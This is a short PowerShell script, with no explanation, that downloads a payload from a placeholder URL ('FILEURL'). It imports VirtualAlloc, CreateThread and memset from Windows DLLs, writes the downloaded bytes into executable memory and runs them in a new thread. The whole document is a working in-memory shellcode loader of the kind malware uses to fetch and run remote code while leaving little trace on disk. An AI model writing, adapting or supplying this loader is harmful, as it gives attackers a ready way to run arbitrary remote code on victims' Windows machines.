function DownloadFile($url) {
    $uri = New-Object "System.Uri" "$url"
    $request = [System.Net.HttpWebRequest]::Create($uri)
    $response = $request.GetResponse()
    $length = $response.get_ContentLength()
    $stream = $response.GetResponseStream()
    $buffer = New-Object byte[] $length
    $stream.Read($buffer, 0, $length)
    return $buffer
}
function Execute($shellcode) {
    $code = '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr a, uint b, uint c);'
    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
    $x = $winFunc::VirtualAlloc(0,$shellcode.Length * 2, 0x3000, 0x40);

    for ($i = 0; $i -le $shellcode.Length; $i++) {
        $result = $winFunc::memset(
            [IntPtr]::Add($x, $i),
            $shellcode[$i],
            1);
    }
    $thread = $winFunc::CreateThread(0, 0, [IntPtr]::Add($x, 1), 0, 0, 0);
    for(;;) { Start-Sleep 60; }
    return;
}
Execute(DownloadFile("FILEURL"))
